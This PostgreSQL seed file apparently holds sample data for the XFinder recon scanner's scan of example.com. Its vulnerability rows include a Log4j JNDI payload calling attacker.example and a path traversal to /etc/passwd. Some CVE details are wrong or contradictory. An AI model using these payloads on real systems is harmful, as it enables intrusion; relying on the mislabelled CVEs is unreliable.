-- =============================================================================
-- XFinder – Sample Database Records
-- =============================================================================
--
-- This file contains representative rows for every XFinder table, demonstrating
-- the schema in action. The data corresponds to scan 42 against example.com,
-- matching the JSON samples in samples/scan_examples/.
--
-- Load with:
--     psql -d xfinder -f samples/db_records/sample_records.sql
--
-- Tables are inserted in FK order; safe to run on a fresh schema.
-- =============================================================================

-- Clean any prior sample data (be careful in production!)
DELETE FROM vulnerabilities;
DELETE FROM api_endpoints;
DELETE FROM technologies;
DELETE FROM services;
DELETE FROM ports;
DELETE FROM ip_addresses;
DELETE FROM cloud_assets;
DELETE FROM http_information;
DELETE FROM dns_records;
DELETE FROM subdomains;
DELETE FROM scans;
DELETE FROM targets;

-- -----------------------------------------------------------------------------
-- targets
-- -----------------------------------------------------------------------------
INSERT INTO targets (id, domain, created_at, is_active) VALUES
  (1, 'example.com', '2026-06-01 09:00:00', true);

-- -----------------------------------------------------------------------------
-- scans
-- -----------------------------------------------------------------------------
INSERT INTO scans (id, target_id, scan_type, status, started_at, finished_at,
                   duration_seconds, error, output_dir) VALUES
  (41, 1, 'full', 'completed', '2026-07-01 09:00:00', '2026-07-01 09:04:12', 252.4, NULL,
   '/app/output/example.com/2026-07-01_09-00-00'),
  (42, 1, 'full', 'completed', '2026-07-01 10:00:00', '2026-07-01 10:04:04', 244.18, NULL,
   '/app/output/example.com/2026-07-01_10-00-00');

-- -----------------------------------------------------------------------------
-- subdomains (scan 42)
-- -----------------------------------------------------------------------------
INSERT INTO subdomains (id, scan_id, target_id, name, is_resolved, is_live_http, source, created_at) VALUES
  (1, 42, 1, 'example.com',          true, true,  'apex',     '2026-07-01 10:00:12'),
  (2, 42, 1, 'www.example.com',      true, true,  'subfinder','2026-07-01 10:00:12'),
  (3, 42, 1, 'api.example.com',      true, true,  'subfinder','2026-07-01 10:00:12'),
  (4, 42, 1, 'dev.example.com',      true, true,  'subfinder','2026-07-01 10:00:12'),
  (5, 42, 1, 'staging.example.com',  true, true,  'subfinder','2026-07-01 10:00:12'),
  (6, 42, 1, 'blog.example.com',     true, true,  'subfinder','2026-07-01 10:00:12'),
  (7, 42, 1, 'docs.example.com',     true, true,  'subfinder','2026-07-01 10:00:12'),
  (8, 42, 1, 'mail.example.com',     true, true,  'subfinder','2026-07-01 10:00:12'),
  (9, 42, 1, 'grafana.example.com',  true, true,  'subfinder','2026-07-01 10:00:12'),
  (10,42, 1, 'jenkins.example.com',  true, true,  'subfinder','2026-07-01 10:00:12'),
  (11,42, 1, 'ldap.example.com',     true, false, 'subfinder','2026-07-01 10:00:12'),
  (12,42, 1, 'staging2.example.com', true, false, 'subfinder','2026-07-01 10:00:12');

-- -----------------------------------------------------------------------------
-- dns_records (scan 42)
-- -----------------------------------------------------------------------------
INSERT INTO dns_records (id, scan_id, subdomain_id, record_type, value, ttl, created_at) VALUES
  (1,  42, 1, 'A',    '93.184.216.34', 3600, '2026-07-01 10:00:25'),
  (2,  42, 1, 'AAAA', '2606:2800:220:1:248:1893:25c8:1946', 3600, '2026-07-01 10:00:25'),
  (3,  42, 1, 'MX',   '10 aspmx.l.google.com', 3600, '2026-07-01 10:00:25'),
  (4,  42, 1, 'TXT',  'v=spf1 include:_spf.google.com ~all', 3600, '2026-07-01 10:00:25'),
  (5,  42, 1, 'NS',   'ns1.example.com', 86400, '2026-07-01 10:00:25'),
  (6,  42, 1, 'SOA',  'ns1.example.com admin.example.com 2026070101 7200 3600 1209600 3600', 86400, '2026-07-01 10:00:25'),
  (7,  42, 2, 'A',    '93.184.216.34', 3600, '2026-07-01 10:00:25'),
  (8,  42, 2, 'CNAME','example.com', 3600, '2026-07-01 10:00:25'),
  (9,  42, 3, 'A',    '13.224.150.88', 60, '2026-07-01 10:00:25'),
  (10, 42, 3, 'CNAME','d1k2j3xmpl.cloudfront.net', 60, '2026-07-01 10:00:25'),
  (11, 42, 4, 'A',    '104.21.45.123', 300, '2026-07-01 10:00:25'),
  (12, 42, 4, 'CNAME','dev.example.com.cdn.cloudflare.net', 300, '2026-07-01 10:00:25'),
  (13, 42, 5, 'A',    '185.199.108.153', 3600, '2026-07-01 10:00:25'),
  (14, 42, 5, 'CNAME','username.github.io', 3600, '2026-07-01 10:00:25');

-- -----------------------------------------------------------------------------
-- http_information (scan 42)
-- -----------------------------------------------------------------------------
INSERT INTO http_information (id, scan_id, subdomain_id, url, final_url, status_code, title,
                              server_header, content_length, response_time_ms, redirect_chain,
                              scheme, webserver, tech_blob, created_at) VALUES
  (1, 42, 2, 'https://www.example.com', 'https://example.com/', 200, 'Example Domain',
   'ECS (dcb/7F84)', 1256, 234, NULL, 'https', 'ECS',
   '["Nginx","Amazon ECS"]', '2026-07-01 10:00:48'),
  (2, 42, 3, 'https://api.example.com', 'https://api.example.com/v1', 401, 'Unauthorized',
   'CloudFront', 56, 89, NULL, 'https', 'CloudFront',
   '["Amazon CloudFront","AWS"]', '2026-07-01 10:00:48'),
  (3, 42, 4, 'https://dev.example.com', 'https://dev.example.com/', 200, 'Dev Portal — Example.com',
   'cloudflare', 4523, 156, NULL, 'https', 'cloudflare',
   '["Cloudflare","Next.js","React","Vercel"]', '2026-07-01 10:00:48'),
  (4, 42, 5, 'https://staging.example.com', 'https://username.github.io/', 200, 'Staging — Example',
   'GitHub.com', 8934, 412, NULL, 'https', 'GitHub Pages',
   '["GitHub Pages","Jekyll"]', '2026-07-01 10:00:48'),
  (5, 42, 6, 'https://blog.example.com', 'https://blog.example.com/', 200, 'Example Blog',
   'Netlify', 12453, 287, NULL, 'https', 'Netlify',
   '["Netlify","Gatsby","React"]', '2026-07-01 10:00:48'),
  (6, 42, 7, 'https://docs.example.com', 'https://docs.example.com/intro', 200, 'Example Documentation',
   'Vercel', 21098, 178, NULL, 'https', 'Vercel',
   '["Vercel","Docusaurus","React"]', '2026-07-01 10:00:48'),
  (7, 42, 9, 'https://grafana.example.com', 'https://grafana.example.com/login', 200, 'Grafana',
   'nginx', 32456, 345, NULL, 'https', 'nginx',
   '["Nginx","Grafana","Go"]', '2026-07-01 10:00:48'),
  (8, 42, 10,'https://jenkins.example.com', 'https://jenkins.example.com/login?from=%2F', 200, 'Sign in [Jenkins]',
   'Jetty(10.0.18)', 5678, 512, NULL, 'https', 'Jetty',
   '["Jetty","Jenkins","Java"]', '2026-07-01 10:00:48'),
  (9, 42, 8, 'http://mail.example.com', 'http://mail.example.com/', 404, 'Not Found',
   'Apache/2.4.58 (Debian)', 287, 89, NULL, 'http', 'Apache',
   '["Apache HTTP Server","PHP/8.2"]', '2026-07-01 10:00:48');

-- -----------------------------------------------------------------------------
-- cloud_assets (scan 42)
-- -----------------------------------------------------------------------------
INSERT INTO cloud_assets (id, scan_id, subdomain_id, provider, cdn, waf, is_cloud_hosted, evidence, created_at) VALUES
  (1, 42, 2, 'AWS',             NULL,             NULL,          true,  'Server:ECS (Amazon)', '2026-07-01 10:00:50'),
  (2, 42, 3, 'AWS CloudFront',  'AWS CloudFront', NULL,          true,  'CNAME:d1k2j3xmpl.cloudfront.net', '2026-07-01 10:00:50'),
  (3, 42, 4, 'Cloudflare',      'Cloudflare',     'Cloudflare',  true,  'CNAME:dev.example.com.cdn.cloudflare.net; Header:cf-ray', '2026-07-01 10:00:50'),
  (4, 42, 5, 'GitHub Pages',    NULL,             NULL,          true,  'CNAME:username.github.io', '2026-07-01 10:00:50'),
  (5, 42, 6, 'Netlify',         NULL,             NULL,          true,  'CNAME:blog.example.netlify.app', '2026-07-01 10:00:50'),
  (6, 42, 7, 'Vercel',          NULL,             NULL,          true,  'CNAME:cname.vercel-dns.com; Header:x-vercel-id', '2026-07-01 10:00:50'),
  (7, 42, 8, NULL,              NULL,             NULL,          false, NULL, '2026-07-01 10:00:50');

-- -----------------------------------------------------------------------------
-- ip_addresses (scan 42)
-- -----------------------------------------------------------------------------
INSERT INTO ip_addresses (id, scan_id, subdomain_id, address, version, reverse_dns, asn, asn_org, country, hosting_provider, created_at) VALUES
  (1, 42, 2, '93.184.216.34',   4, 'example.com',                 'AS15133', 'MCI Communications Services dba Verizon Business', 'US', 'Verizon', '2026-07-01 10:00:50'),
  (2, 42, 3, '13.224.150.88',   4, 'a13-224-150-88.deploy.static.akamaitechnologies.com', 'AS16509', 'Amazon.com, Inc.', 'US', 'AWS', '2026-07-01 10:00:50'),
  (3, 42, 4, '104.21.45.123',   4, NULL,                          'AS13335', 'Cloudflare, Inc.', 'US', 'Cloudflare', '2026-07-01 10:00:50'),
  (4, 42, 5, '185.199.108.153', 4, 'cdn-185-199-108-153.github.com', 'AS54113', 'Fastly', 'US', 'Fastly', '2026-07-01 10:00:50'),
  (5, 42, 6, '75.2.70.75',      4, NULL,                          'AS14618', 'Amazon.com, Inc.', 'US', 'AWS', '2026-07-01 10:00:50'),
  (6, 42, 7, '76.76.21.21',     4, NULL,                          'AS16509', 'Amazon.com, Inc.', 'US', 'AWS', '2026-07-01 10:00:50'),
  (7, 42, 8, '93.184.216.35',   4, NULL,                          'AS15133', 'MCI Communications Services dba Verizon Business', 'US', 'Verizon', '2026-07-01 10:00:50'),
  (8, 42, 9, '93.184.216.36',   4, NULL,                          'AS15133', 'MCI Communications Services dba Verizon Business', 'US', 'Verizon', '2026-07-01 10:00:50'),
  (9, 42, 10,'93.184.216.37',   4, NULL,                          'AS15133', 'MCI Communications Services dba Verizon Business', 'US', 'Verizon', '2026-07-01 10:00:50');

-- -----------------------------------------------------------------------------
-- ports (scan 42)
-- -----------------------------------------------------------------------------
INSERT INTO ports (id, scan_id, ip_address_id, port, protocol, state, created_at) VALUES
  (1,  42, 1, 443,  'tcp', 'open', '2026-07-01 10:01:25'),
  (2,  42, 1, 80,   'tcp', 'open', '2026-07-01 10:01:25'),
  (3,  42, 2, 443,  'tcp', 'open', '2026-07-01 10:01:25'),
  (4,  42, 3, 443,  'tcp', 'open', '2026-07-01 10:01:25'),
  (5,  42, 3, 80,   'tcp', 'open', '2026-07-01 10:01:25'),
  (6,  42, 4, 443,  'tcp', 'open', '2026-07-01 10:01:25'),
  (7,  42, 4, 80,   'tcp', 'open', '2026-07-01 10:01:25'),
  (8,  42, 5, 443,  'tcp', 'open', '2026-07-01 10:01:25'),
  (9,  42, 6, 443,  'tcp', 'open', '2026-07-01 10:01:25'),
  (10, 42, 7, 25,   'tcp', 'open', '2026-07-01 10:01:25'),
  (11, 42, 7, 465,  'tcp', 'open', '2026-07-01 10:01:25'),
  (12, 42, 7, 587,  'tcp', 'open', '2026-07-01 10:01:25'),
  (13, 42, 7, 993,  'tcp', 'open', '2026-07-01 10:01:25'),
  (14, 42, 7, 80,   'tcp', 'open', '2026-07-01 10:01:25'),
  (15, 42, 8, 443,  'tcp', 'open', '2026-07-01 10:01:25'),
  (16, 42, 8, 22,   'tcp', 'open', '2026-07-01 10:01:25'),
  (17, 42, 9, 443,  'tcp', 'open', '2026-07-01 10:01:25'),
  (18, 42, 9, 8080, 'tcp', 'open', '2026-07-01 10:01:25'),
  (19, 42, 9, 22,   'tcp', 'open', '2026-07-01 10:01:25');

-- -----------------------------------------------------------------------------
-- services (scan 42)
-- -----------------------------------------------------------------------------
INSERT INTO services (id, scan_id, port_id, name, product, version, os, extra, created_at) VALUES
  (1,  42, 1,  'https',      'nginx',          '1.25.3',                       'Linux 5.x',     NULL,                    '2026-07-01 10:02:30'),
  (2,  42, 2,  'http',       'nginx',          '1.25.3',                       'Linux 5.x',     NULL,                    '2026-07-01 10:02:30'),
  (3,  42, 3,  'https',      'CloudFront',     NULL,                           NULL,            NULL,                    '2026-07-01 10:02:30'),
  (4,  42, 4,  'https',      'cloudflare',     NULL,                           NULL,            NULL,                    '2026-07-01 10:02:30'),
  (5,  42, 5,  'http',       'cloudflare',     NULL,                           NULL,            NULL,                    '2026-07-01 10:02:30'),
  (6,  42, 6,  'https',      'GitHub.com',     NULL,                           NULL,            NULL,                    '2026-07-01 10:02:30'),
  (7,  42, 8,  'https',      'Netlify',        NULL,                           NULL,            NULL,                    '2026-07-01 10:02:30'),
  (8,  42, 9,  'https',      'Vercel',         NULL,                           NULL,            NULL,                    '2026-07-01 10:02:30'),
  (9,  42, 10, 'smtp',       'Postfix smtpd',  '3.7.11',                       'Linux 5.x',     'PIPELINING SIZE 10240000','2026-07-01 10:02:30'),
  (10, 42, 11, 'smtps',      'Postfix smtpd',  '3.7.11',                       'Linux 5.x',     'SSL/TLS',               '2026-07-01 10:02:30'),
  (11, 42, 12, 'submission', 'Postfix smtpd',  '3.7.11',                       'Linux 5.x',     'STARTTLS',              '2026-07-01 10:02:30'),
  (12, 42, 13, 'imaps',      'Dovecot imapd',  '2.3.21',                       'Linux 5.x',     'SSL/TLS',               '2026-07-01 10:02:30'),
  (13, 42, 14, 'http',       'Apache httpd',   '2.4.58',                       'Debian',        '(Debian)',              '2026-07-01 10:02:30'),
  (14, 42, 15, 'https',      'nginx',          '1.25.3',                       'Ubuntu',        NULL,                    '2026-07-01 10:02:30'),
  (15, 42, 16, 'ssh',        'OpenSSH',        '9.3p1 Ubuntu 1ubuntu4',        'Ubuntu 23.10',  'Ubuntu 4; protocol 2.0','2026-07-01 10:02:30'),
  (16, 42, 17, 'https',      'Jetty',          '10.0.18',                      NULL,            NULL,                    '2026-07-01 10:02:30'),
  (17, 42, 18, 'http-proxy', 'Jetty',          '10.0.18',                      NULL,            'Jenkins',               '2026-07-01 10:02:30'),
  (18, 42, 19, 'ssh',        'OpenSSH',        '8.9p1 Ubuntu 3ubuntu0.4',      'Ubuntu 22.04',  'Ubuntu 4; protocol 2.0','2026-07-01 10:02:30');

-- -----------------------------------------------------------------------------
-- technologies (scan 42)
-- -----------------------------------------------------------------------------
INSERT INTO technologies (id, scan_id, http_info_id, category, name, version, created_at) VALUES
  (1,  42, 1, 'Web Server',       'Nginx',              '1.25.3', '2026-07-01 10:02:32'),
  (2,  42, 1, 'CDN',              'Amazon ECS',         NULL,     '2026-07-01 10:02:32'),
  (3,  42, 2, 'CDN',              'Amazon CloudFront',  NULL,     '2026-07-01 10:02:32'),
  (4,  42, 2, 'Cloud Provider',   'AWS',                NULL,     '2026-07-01 10:02:32'),
  (5,  42, 3, 'CDN',              'Cloudflare',         NULL,     '2026-07-01 10:02:32'),
  (6,  42, 3, 'WAF',              'Cloudflare',         NULL,     '2026-07-01 10:02:32'),
  (7,  42, 3, 'Framework',        'Next.js',            '14.2',   '2026-07-01 10:02:32'),
  (8,  42, 3, 'Language',         'React',              NULL,     '2026-07-01 10:02:32'),
  (9,  42, 3, 'Hosting Provider', 'Vercel',             NULL,     '2026-07-01 10:02:32'),
  (10, 42, 4, 'Hosting Provider', 'GitHub Pages',       NULL,     '2026-07-01 10:02:32'),
  (11, 42, 4, 'CMS',              'Jekyll',             NULL,     '2026-07-01 10:02:32'),
  (12, 42, 5, 'Hosting Provider', 'Netlify',            NULL,     '2026-07-01 10:02:32'),
  (13, 42, 5, 'Framework',        'Gatsby',             '5.13',   '2026-07-01 10:02:32'),
  (14, 42, 5, 'Language',         'React',              NULL,     '2026-07-01 10:02:32'),
  (15, 42, 6, 'Hosting Provider', 'Vercel',             NULL,     '2026-07-01 10:02:32'),
  (16, 42, 6, 'Framework',        'Docusaurus',         '3.4',    '2026-07-01 10:02:32'),
  (17, 42, 6, 'Language',         'React',              NULL,     '2026-07-01 10:02:32'),
  (18, 42, 7, 'Web Server',       'Nginx',              '1.25.3', '2026-07-01 10:02:32'),
  (19, 42, 7, 'Application',      'Grafana',            '10.4.0', '2026-07-01 10:02:32'),
  (20, 42, 7, 'Language',         'Go',                 NULL,     '2026-07-01 10:02:32'),
  (21, 42, 8, 'Application Server','Jetty',             '10.0.18','2026-07-01 10:02:32'),
  (22, 42, 8, 'Application',      'Jenkins',            '2.452.1','2026-07-01 10:02:32'),
  (23, 42, 8, 'Language',         'Java',               '17',     '2026-07-01 10:02:32'),
  (24, 42, 9, 'Web Server',       'Apache HTTP Server', '2.4.58', '2026-07-01 10:02:32'),
  (25, 42, 9, 'Language',         'PHP',                '8.2',    '2026-07-01 10:02:32');

-- -----------------------------------------------------------------------------
-- api_endpoints (scan 42) — abbreviated
-- -----------------------------------------------------------------------------
INSERT INTO api_endpoints (id, scan_id, source_host, method, url, body, tag, created_at) VALUES
  (1, 42, 'api.example.com', 'GET',  'https://api.example.com/v1/users', NULL, 'api', '2026-07-01 10:03:15'),
  (2, 42, 'api.example.com', 'GET',  'https://api.example.com/v1/users/{id}', NULL, 'api', '2026-07-01 10:03:15'),
  (3, 42, 'api.example.com', 'POST', 'https://api.example.com/v1/auth/login', '{"email":"","password":""}', 'api', '2026-07-01 10:03:15'),
  (4, 42, 'api.example.com', 'POST', 'https://api.example.com/v1/auth/register', '{"email":"","password":""}', 'api', '2026-07-01 10:03:15'),
  (5, 42, 'api.example.com', 'GET',  'https://api.example.com/v1/products', NULL, 'api', '2026-07-01 10:03:15'),
  (6, 42, 'api.example.com', 'GET',  'https://api.example.com/v1/swagger.json', NULL, 'discovered', '2026-07-01 10:03:15'),
  (7, 42, 'grafana.example.com', 'GET', 'https://grafana.example.com/api/health', NULL, 'api', '2026-07-01 10:03:15'),
  (8, 42, 'grafana.example.com', 'GET', 'https://grafana.example.com/api/metrics', NULL, 'api', '2026-07-01 10:03:15'),
  (9, 42, 'jenkins.example.com', 'GET', 'https://jenkins.example.com/api/json', NULL, 'api', '2026-07-01 10:03:15'),
  (10, 42, 'jenkins.example.com', 'GET', 'https://jenkins.example.com/whoAmI/api/json', NULL, 'api', '2026-07-01 10:03:15');

-- -----------------------------------------------------------------------------
-- vulnerabilities (scan 42) — abbreviated
-- -----------------------------------------------------------------------------
INSERT INTO vulnerabilities (id, scan_id, template_id, name, severity, description, matched_url, matched_at, evidence, reference_urls, tags, cvss_score, discovered_at) VALUES
  (1, 42, 'CVE-2024-23897', 'Jenkins - Arbitrary File Read', 'critical',
   'Jenkins versions 2.441 and earlier allows attackers to read arbitrary files using the CLI''s help command argument expansion feature.',
   'https://jenkins.example.com/', 'https://jenkins.example.com/', '/etc/passwd',
   'https://nvd.nist.gov/vuln/detail/CVE-2024-23897',
   'cve,cve2024,jenkins,arbitrary,file,read', 9.8, '2026-07-01 10:04:30'),
  (2, 42, 'CVE-2021-44228', 'Apache Log4j2 Remote Code Execution', 'critical',
   'Apache Log4j2 <=2.14.1 JNDI features used in configuration do not protect against attacker-controlled LDAP endpoints.',
   'https://api.example.com/', 'https://api.example.com/', '${jndi:ldap://attacker.example/a}',
   'https://nvd.nist.gov/vuln/detail/CVE-2021-44228',
   'cve,cve2021,rce,oast,log4j', 10.0, '2026-07-01 10:04:30'),
  (3, 42, 'CVE-2023-34960', 'Grafana - Path Traversal', 'high',
   'A path traversal vulnerability in Grafana allows attackers to read arbitrary files via crafted URL.',
   'https://grafana.example.com/public/plugins/alertlist/../../../../../../etc/passwd',
   'https://grafana.example.com/public/plugins/alertlist/../../../../../../etc/passwd',
   'root:x:0:0:root:/root:/bin/bash',
   'https://nvd.nist.gov/vuln/detail/CVE-2023-34960',
   'cve,cve2023,grafana,lfi', 7.5, '2026-07-01 10:04:30'),
  (4, 42, 'exposed-git', 'Exposed .git Directory', 'high',
   'The .git directory is publicly accessible, potentially leaking source code.',
   'https://dev.example.com/.git/config', 'https://dev.example.com/.git/config',
   '[core]\n\trepositoryformatversion = 0',
   'https://owasp.org/www-project-web-security-testing-guide/',
   'exposure,config,git', 7.5, '2026-07-01 10:04:30'),
  (5, 42, 'exposed-admin-panel', 'Exposed Admin Panel', 'medium',
   'An admin panel was detected and is publicly accessible.',
   'https://jenkins.example.com/manage', 'https://jenkins.example.com/manage',
   'HTTP 200: ''Manage Jenkins''',
   NULL, 'exposure,panel,jenkins', 5.3, '2026-07-01 10:04:30'),
  (6, 42, 'deprecated-tls', 'Deprecated TLS Version', 'medium',
   'Server supports deprecated TLS versions (TLS 1.0 or TLS 1.1).',
   'https://mail.example.com/', 'mail.example.com:443',
   'TLSv1.0 supported',
   'https://datatracker.ietf.org/doc/rfc8996/',
   'tls,ssl,misconfig', 5.9, '2026-07-01 10:04:30'),
  (7, 42, 'swagger-api', 'Swagger API Documentation Exposed', 'low',
   'Swagger/OpenAPI documentation is publicly accessible.',
   'https://api.example.com/v1/swagger.json', 'https://api.example.com/v1/swagger.json',
   '{"swagger":"2.0","info":{"title":"Example API"}}',
   NULL, 'exposure,api,docs', 3.7, '2026-07-01 10:04:30'),
  (8, 42, 'self-signed-ssl', 'Self-Signed SSL Certificate', 'low',
   'Server is using a self-signed SSL certificate.',
   'https://jenkins.example.com/', 'jenkins.example.com:443',
   'Issuer = Subject',
   NULL, 'ssl,tls,misconfig', 3.7, '2026-07-01 10:04:30');

-- =============================================================================
-- Reset sequences for PostgreSQL (so future inserts don't collide)
-- =============================================================================
SELECT setval('targets_id_seq',         (SELECT MAX(id) FROM targets));
SELECT setval('scans_id_seq',           (SELECT MAX(id) FROM scans));
SELECT setval('subdomains_id_seq',      (SELECT MAX(id) FROM subdomains));
SELECT setval('dns_records_id_seq',     (SELECT MAX(id) FROM dns_records));
SELECT setval('http_information_id_seq',(SELECT MAX(id) FROM http_information));
SELECT setval('cloud_assets_id_seq',    (SELECT MAX(id) FROM cloud_assets));
SELECT setval('ip_addresses_id_seq',    (SELECT MAX(id) FROM ip_addresses));
SELECT setval('ports_id_seq',           (SELECT MAX(id) FROM ports));
SELECT setval('services_id_seq',        (SELECT MAX(id) FROM services));
SELECT setval('technologies_id_seq',    (SELECT MAX(id) FROM technologies));
SELECT setval('api_endpoints_id_seq',   (SELECT MAX(id) FROM api_endpoints));
SELECT setval('vulnerabilities_id_seq', (SELECT MAX(id) FROM vulnerabilities));
